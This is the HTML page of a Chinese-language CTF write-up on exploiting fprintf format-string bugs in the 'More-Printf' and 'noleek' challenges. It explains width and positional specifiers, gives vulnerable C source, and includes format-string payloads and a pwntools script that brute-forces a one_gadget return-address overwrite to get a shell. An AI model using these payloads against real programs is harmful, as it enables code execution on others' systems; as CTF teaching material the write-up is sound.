@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总结 int fprintf(FILE *stream, const char *format, ...); fprintf函数的作用是将格式化的数据扔到指定的文件流里，其实际上是vfprintf函数的封装 printf的功能其实等价于fprintf(stdout, ...)，且printf函数其实也是vfprintf函数的封装 所以fprintf和printf的区别其实很小，printf中能用的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="noleek-fprintf">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="总结 int fprintf(FILE *stream, const char *format, ...); fprintf函数的作用是将格式化的数据扔到指定的文件流里，其实际上是vfprintf函数的封装 printf的功能其实等价于fprintf(stdout, ...)，且printf函数其实也是vfprintf函数的封装 所以fprintf和printf的区别其实很小，printf中能用的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425203007009.png">
+<meta property="og:image" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425200641896.png">
+<meta property="og:image" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425200551010.png">
+<meta property="og:image" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425234957377.png">
+<meta property="og:image" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425233658664.png">
+<meta property="article:published_time" content="2023-04-24T14:20:04.000Z">
+<meta property="article:modified_time" content="2024-05-24T05:11:21.015Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="格式化字符串">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425203007009.png">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>noleek-fprintf | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          noleek-fprintf
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-24 22:20:04" itemprop="dateCreated datePublished" datetime="2023-04-24T22:20:04+08:00">2023-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-24 13:11:21" itemprop="dateModified" datetime="2024-05-24T13:11:21+08:00">2024-05-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li><p><code>int fprintf(FILE *stream, const char *format, ...);</code></p>
+<p><code>fprintf</code>函数的作用是将格式化的数据扔到指定的文件流里，其实际上是<code>vfprintf</code>函数的封装</p>
+<p><code>printf</code>的功能其实等价于<code>fprintf(stdout, ...)</code>，且<code>printf</code>函数其实也是<code>vfprintf</code>函数的封装</p>
+<p>所以<code>fprintf</code>和<code>printf</code>的区别其实很小，printf中能用的东西在这也能用</p>
+</li>
+<li><p>具体到<code>More-Printf</code>这题，<code>fprintf</code>往<code>/dev/null</code>里扔数据，这种情况及其类似情况就可以用<code>%n</code>来直接写四个字节，以及用<code>%?c</code>去输出巨多数据，估计是因为不用实际在标准输出里打印出来，所以速度快很多且不会crash</p>
+</li>
+<li><p><code>More-Printf</code>这题中有个很重要的知识点是宽度符<code>*</code>的使用，例如<code>printf(&quot;%*d&quot;, 5, 10);</code>，那么实际上会打印宽度为五个字节的整数’10’，简单地说，宽度符<code>*</code>也往后解析一个参数作为要打印数据的宽度，其跟<code>%10c</code>这种宽度指定没什么区别，不足的输出长度补充到10个字节，超过10个字节的输出也不会截断它，只是宽度符会往后解析一个参数。</p>
+<p>也很重要的一点是宽度符也可以指定位置符号<code>$</code>，例如<code>%*8$d</code>，这种情况下<code>8</code>这个偏移是宽度符<code>*</code>的指定而不是说明符<code>d</code>的指定，也就是说其会解析格式化字符串的第8个参数来作为宽度，<code>d</code>则正常计算，有这一点就可以想到实际上可以指定栈上的某个值来作为宽度，直接输出那么多个字节的字符，再配合<code>n</code>来写入。这样的好处是不需要泄露一些地址的具体值就可以打印其对应的值</p>
+</li>
+<li><p>这一点也很重要，但是目前没写demo去理解其过程，所以可能存在某些细节错误：</p>
+<blockquote>
+<p>同样重要的是要注意，我们只能使用一个位置参数来修改堆栈上的值。</p>
+<blockquote>
+<p>fprintf 将在内部调用 vfprintf。当 vfprintf 遇到第一个位置参数 $ 时，它将所有需要的参数复制到内部缓冲区，在下一个位置参数 $ 上，它将获取那里的原始值而不是更改后的值。</p>
+</blockquote>
+</blockquote>
+<p><code>%&lt;offset&gt;$&lt;specifier&gt;</code>这种表示法可以算是独出来的，其跟直接<code>%&lt;specifier&gt;</code>的形式不太一样，首先一个区别是上面提到的这点，然后是这种表示法不会影响到<code>%&lt;specifier&gt;</code>形式的计算，例如<code>printf(&quot;%d, %d&quot;, a, b);</code>，我们知道第一个<code>%d</code>解析的是格式化字符串的第一个参数，第二个<code>%d</code>解析的是格式化字符串的第二个参数，再往后的<code>%?</code>依次递增，但是在格式化字符串的任何位置插入<code>%&lt;offset&gt;$&lt;specifier&gt;</code>这种表示法的说明符都不会影响正常的<code>%&lt;specifier&gt;</code>这种形式的递增值，这样表述比较乱，举个例子来说，<code>printf(&quot;%d, %10$d, %d&quot;, a, b);</code>这样，格式化字符串中的<code>%10$d</code>不会影响它后面的那个<code>%d</code>的计数，那个<code>%d</code>还是会解析格式化字符串的第二个参数</p>
+<p>关于”其会将对应值复制到内部缓冲区中，在下次用到这个值的时候不会再从堆栈上取，而是使用这个缓冲区中的值”这句话具体到题目来看</p>
+</li>
+</ol>
+<h2 id="Zh3r0-CTF-More-Printf"><a href="#Zh3r0-CTF-More-Printf" class="headerlink" title="Zh3r0 CTF More-Printf"></a>Zh3r0 CTF More-Printf</h2><p><a target="_blank" rel="noopener" href="https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/">很好的WP</a></p>
+<p>源码如下，环境是<code>glibc-2.27-3ubuntu1.4_amd64</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc -o more-printf -fstack-protector-all more-printf.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"><span class="keyword">uint64_t</span> i = <span class="number">0x8d9e7e558877</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">_Noreturn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Just to save some of your time */</span></span><br><span class="line">  <span class="keyword">uint64_t</span> *p;</span><br><span class="line">  p = &amp;p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Chall */</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span> + <span class="number">1</span>);</span><br><span class="line">  fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  fgets(buffer, <span class="number">0x1f</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">0x8d9e7e558877</span>) &#123;</span><br><span class="line">    _exit(<span class="number">1337</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    i = <span class="number">1337</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, buffer);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>源码理解起来很简单，<code>p = &amp;p;</code>的作用其实就是在栈上放了一个可以很容易被操控的栈指针，从程序逻辑可知，当按照正常流程走了一次<code>fprintf</code>之后，<code>i</code>的值就已经被改变了，所以如果想要用某种方法再次返回到main的话也会在<code>if</code>那里挂掉，所以这题其实只提供了一次<code>fprintf</code>的机会</p>
+<p>由此其实比较自然地能想到要改某个返回地址为<code>one_gadget</code>，而这个地址不会是<code>libc_start_main</code>，因为是<code>exit</code>结束的，也不会是<code>fprintf</code>的返回地址，因为它的返回地址是个PIE的程序段，很明显就只能是fprintf函数的内部调用链，最简单的就是<code>vfprintf</code>的返回地址，调试一下发现<code>vfprintf</code>的返回地址所在的栈地址跟<code>p</code>所在的地址相差<code>0xe0</code>个字节，所以是有机会爆破出来的</p>
+<p>首先是调试出栈上的某些地址相对于<code>fprintf</code>格式化字符串的偏移，输入<code>%p%p%p%p%p%p%p%p</code>，然后断在<code>call vfprintf</code>处，把文件流参数改成stdout</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $rdi=stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425203007009.png" alt="image-20230425203007009"></p>
+<p>由此可以确定出<code>%1$ - %8$</code>偏移对应的地址，<code>%8$</code>对应<code>libc_start_main</code>的地址，<code>%5$</code>对应<code>p</code>的地址</p>
+<p>难点在于如何在不泄露libc的情况下把<code>vfprintf</code>的返回地址改成<code>one_gadget</code>，虽然libc的低12位是固定的，但是它们的高位需要爆破，直接来爆成功率过低，所以这里就需要用到<code>*</code>宽度符来打印出<code>libc_start_main</code>的地址长度的字节，再打印出其与<code>one_gadget</code>的偏移（这个是固定的），然后再用<code>%n</code>去写四个字节到<code>fprintf</code>的返回地址中，这样需要爆破的点就少了很多</p>
+<p>接下来来到有关<code>%?$</code>表达式的问题，以这个题目来进行测试，用如下payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%c%c%c%5c%hhn%5$n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>按照这个payload，<code>%5$n</code>是第一个偏移表达式，此时这个payload对栈的修改如下</p>
+<p>第一个<code>%hhn</code>会把<code>p</code>的低位盖成<code>0x8</code>，然后<code>%5$n</code>会往修改之后的<code>p</code>指向的位置写四个字节的<code>8</code>（这也是正常情况），如下</p>
+<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425200641896.png" alt="image-20230425200641896"></p>
+<p>但是如果我在前面先用一个跟<code>p</code>一点关系都没有的<code>%?$</code>表达式呢？此时<code>%5$n</code>是第二个偏移表达式，其对栈的修改如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%1$c%c%c%c%4c%hhn%5$n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样对比就很明显了，这里很明显是第二次的<code>%5$n</code>再次把原来的值给改了</p>
+<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425200551010.png" alt="image-20230425200551010"></p>
+<p>所以在用第一个<code>%?$</code>偏移表达式之前就需要先把<code>p</code>的低位覆盖成<code>0x8</code>，然后再用偏移表达式去改</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc_base = <span class="number">0x7ffff79e2000</span></span><br><span class="line">og = libc_base + one[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%c%c%c%5c%hhn%*8$c%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x4f3d5</span> - (<span class="number">0x7f93a0892bf7</span> - <span class="number">0x7f93a0871000</span>) - <span class="number">8</span>) + <span class="string">b&#x27;c%5$n&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./more-printf&#x27;</span>)</span><br><span class="line">		p.sendline(payload)</span><br><span class="line">		p.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">		p.recv()<span class="comment">#timeout=0.5)</span></span><br><span class="line">		p.interactive()</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="angstromCTF-noleek"><a href="#angstromCTF-noleek" class="headerlink" title="ångstromCTF noleek"></a>ångstromCTF noleek</h2><p>比赛中给的docker的环境是<code>Debian GLIBC 2.31-13+deb11u5</code>的，我在本机复现时懒得搞环境了，就用了跟上一题一样的<code>glibc-2.27-3ubuntu1.4_amd64</code>来复现</p>
+<h3 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEEK 32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    FILE* leeks = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (leeks == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leek? &quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> inp[LEEK];</span><br><span class="line">    fgets(inp, LEEK, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(leeks, inp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;more leek? &quot;</span>);</span><br><span class="line">    fgets(inp, LEEK, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(leeks, inp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;noleek.\n&quot;</span>);</span><br><span class="line">    cleanup(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这题跟上一题其实区别不大，只是这题给了两次<code>fprintf</code>，但是没给指向自身的那个<code>p</code>指针，有了上一题的经验就会很自然地想，第一个<code>fprintf</code>应该是用来做出一个可修改返回地址的指针来的，然后第二次<code>fprintf</code>就用来改返回地址</p>
+<p>还是断在<code>call vfprintf</code>处看栈空间</p>
+<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425234957377.png" alt="image-20230425234957377"></p>
+<p>发现有一条可以用的链，配合<code>*</code>宽度符将其改成指向<code>libc_start_main</code>，然后就跟前面那题一模一样了，流程都一样就不说了</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425233658664.png" alt="image-20230425233658664"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"># 格式化字符串</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/26/Kernel/" rel="prev" title="Kernel">
+      <i class="fa fa-chevron-left"></i> Kernel
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/04/30/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-pwn/" rel="next" title="2023长城杯决赛-pwn">
+      2023长城杯决赛-pwn <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Zh3r0-CTF-More-Printf"><span class="nav-number">1.1.</span> <span class="nav-text">Zh3r0 CTF More-Printf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-number">1.1.1.</span> <span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#angstromCTF-noleek"><span class="nav-number">1.2.</span> <span class="nav-text">ångstromCTF noleek</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%A6%82%E4%B8%8B"><span class="nav-number">1.2.1.</span> <span class="nav-text">源码如下</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-1"><span class="nav-number">1.2.3.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
